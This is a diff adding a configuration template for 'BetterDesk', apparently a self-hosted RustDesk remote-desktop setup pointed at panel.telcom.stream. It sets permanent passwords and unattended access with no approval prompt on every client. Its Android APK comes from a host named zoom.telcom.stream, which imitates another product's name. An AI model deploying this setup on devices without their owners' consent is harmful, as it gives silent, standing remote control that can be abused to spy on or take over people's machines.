@@ -1,0 +1,38 @@
+# BetterDesk — Unattended Access Configuration Template
+# Apply this to every client device for operator remote control without approval.
+#
+# Server: panel.telcom.stream
+# API:    https://panel.telcom.stream/api
+#
+# Windows (PowerShell, run as Administrator):
+#   .\tools\setup-unattended-local.ps1 -Password <your-permanent-password>
+#
+# macOS / Linux:
+#   Edit the client config file (RustDesk.toml2 / config.toml) with:
+#     custom-rendezvous-server = 'panel.telcom.stream'
+#     relay-server = 'panel.telcom.stream'
+#     api-server = 'https://panel.telcom.stream/api'
+#     key = '<server-public-key>'
+#     verification-method = 'use-permanent-password'
+#     allow-websocket = 'Y'
+#   Then set a permanent password in the client UI and enable service/autostart.
+#
+# Android:
+#   Install the APK from https://zoom.telcom.stream/download/android
+#   Open the app → Settings → Security → Permanent password → set a password
+#   Enable "Unattended access" toggle (no approval prompt for operators)
+#
+# Connect from admin console:
+#   https://panel.telcom.stream → select device → Remote → enter ID + password
+
+SERVER_HOST=panel.telcom.stream
+API_URL=https://panel.telcom.stream/api
+SERVER_KEY=q8UeY1D2/XMe8GddEW7mBoK5KaGQFUYEBn6yFqtRgYA=
+
+[options]
+custom-rendezvous-server = 'panel.telcom.stream'
+relay-server = 'panel.telcom.stream'
+api-server = 'https://panel.telcom.stream/api'
+key = 'q8UeY1D2/XMe8GddEW7mBoK5KaGQFUYEBn6yFqtRgYA='
+verification-method = 'use-permanent-password'
+allow-websocket = 'Y'
